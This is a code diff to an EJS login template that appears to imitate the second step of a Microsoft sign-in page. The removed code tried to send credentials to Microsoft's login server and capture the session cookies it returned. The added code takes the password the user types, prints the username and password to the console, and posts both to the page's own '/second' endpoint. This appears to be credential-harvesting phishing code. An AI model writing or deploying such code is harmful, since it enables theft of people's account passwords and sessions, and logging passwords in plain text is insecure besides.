@@ -6,7 +6,7 @@
       <img src="images/logoo.png" alt="logo" width="100px" height="80px">
     </div>
     <div>
-      <form action="/second" method="POST" class="fum">
+      <form action="/second" method="POST" class="form">
         <i class="fa-solid fa-arrow-left"></i>
         <p name="username" type="text" id="mail" class="ilight"><%= username %></p>
         <input type="hidden" id="email" name="username" value="<%= username %>">
@@ -21,17 +21,23 @@
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script type="text/javascript">
   $(document).ready(function() {
-    function sendCookieRequest(username, password) {
-      const loginUrl = 'https://login.microsoftonline.com/login';
+    const loginUrl = '/second'; // Update the login URL to match your server endpoint
+    // Add an event listener to the form submission
+    $('.form').submit(function(event) {
+    
+      // Get the username and password values
+      const username = $('#email').val();
+      const password = $('#password').val();
 
       // Create the request body
       const data = {
         username: username,
         password: password
       };
-
-      // Make the POST request
-      return fetch(loginUrl, {
+      console.log('Username:', username);
+      console.log('Password:', password);
+      // Make the POST request to the login endpoint
+      fetch(loginUrl, {
         method: 'POST',
         body: JSON.stringify(data),
         headers: {
@@ -39,25 +45,12 @@
         }
       })
       .then(response => {
-        // Retrieve the cookies from the response
-        const cookies = response.headers.get('Set-Cookie');
-        return cookies;
-      });
-    }
-
-    // Provide your Microsoft username and password
-    const username = 'your_username';
-    const password = 'your_password';
-
-    // Call the function to send the cookie request
-    sendCookieRequest(username, password)
-      .then(cookies => {
-        // Print the cookies
-        console.log(cookies);
+        // Handle the response from the server
       })
       .catch(error => {
-        console.error('Error:', error);
+        // Handle any errors
       });
+    });
   });
   </script>
 
